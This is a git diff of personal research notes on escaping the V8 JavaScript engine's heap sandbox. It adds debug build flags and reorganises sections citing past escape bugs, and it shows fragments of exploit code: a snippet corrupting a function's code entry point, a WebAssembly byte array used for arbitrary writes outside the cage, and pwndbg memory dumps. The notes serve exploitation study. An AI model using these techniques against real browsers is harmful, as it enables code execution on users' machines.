@@ -1,12 +1,33 @@
 
 ## Table of Contents
-- [V8 Sandbox](#V8-Sandbox)
+- [Debugging V8](#Debugging-V8)
+- [V8 Sandbox](#V8-(heap)-Sandbox)
   - [Studying Previous Sandbox Escape Techniques](#Studying-Previous-Sandbox-Escape-Techniques)
+  - [Understanding Mutable Page Metadata](#Understanding-Mutable-Page-Metadata)
+- [Conclusion](#Conclusion)
+
+
+
+## Debugging V8
+
+Arguments:
+
+```
+is_debug = true
+symbol_level = 2
+dcheck_always_on = false
+target_cpu = "x64"
+v8_enable_memory_corruption_api = true
+v8_enable_object_print = true
+v8_optimized_debug = false
+v8_enable_backtrace = true
+```
 
 
 ## V8 (heap) Sandbox
 
-- Setting up commands
+**Setting up commands**
+
 ```cpp
 // r --allow-natives-syntax --sandbox-testing ../../../test.js
 r --allow-natives-syntax --expose-gc --sandbox-testing ../../../tests/test.js
@@ -76,9 +97,9 @@ pwndbg> x/20gx 0x1397000493f5-1
     3. https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/
     4. https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf
 
-- V8 virtual memory cage
 
 **Idea 1: Corrupting a Function object to redirect code execution to an arbitrary location**
+
 Example:
 ```js
 const foo = () => {
@@ -94,7 +115,8 @@ The author manipulates the `code_entry_point` of a function that it's possible t
 
   - https://issues.chromium.org/issues/40068627
   - https://issues.chromium.org/issues/41482162
-this idea demonstrates how to gain relative out-of-bound (OOB) read/write access by manipulating the length of an Array object. The solution involved manipulating WebAssembly's use of global variables to achieve arbitrary write access outside of the cage. 
+
+This idea demonstrates how to gain relative out-of-bound (OOB) read/write access by manipulating the length of an Array object. The solution involved manipulating WebAssembly's use of global variables to achieve arbitrary write access outside of the cage. 
 
 ```js
 var wasm_code2 = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
@@ -178,20 +200,15 @@ DebugPrint: 0x170f0029a651: [WasmInstanceObject] in OldSpace
  - dependent code: 0x170f00000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
  - construction counter: 0
 
-
 ```
+They moved all of trusted data to readonly region. 
 
-**Idea 3: Strin's length**
+**Idea 3: Global values that can access out of sandbox**
 
-  - https://chromium-review.googlesource.com/c/v8/v8/+/5335156
+  - String's length: https://chromium-review.googlesource.com/c/v8/v8/+/5335156
+  - Builtin_id: https://chromium-review.googlesource.com/c/v8/v8/+/5332218 
 
-**Idea 4: Builtin id**
-  - https://chromium-review.googlesource.com/c/v8/v8/+/5332218
-
-### Debugging V8 
-...
-
-### Mutable Page Metadata
+### Understanding Mutable Page Metadata
 
 - heap_base
 ```js
@@ -550,7 +567,7 @@ Another stacktrace:
 #21 0x00005555556388da in _start ()
 ```
 
-### Rechecking 
+**Rechecking** 
 
 ```cpp
 pwndbg> find 0x1e700000000,0x1e800000000,0x1e700
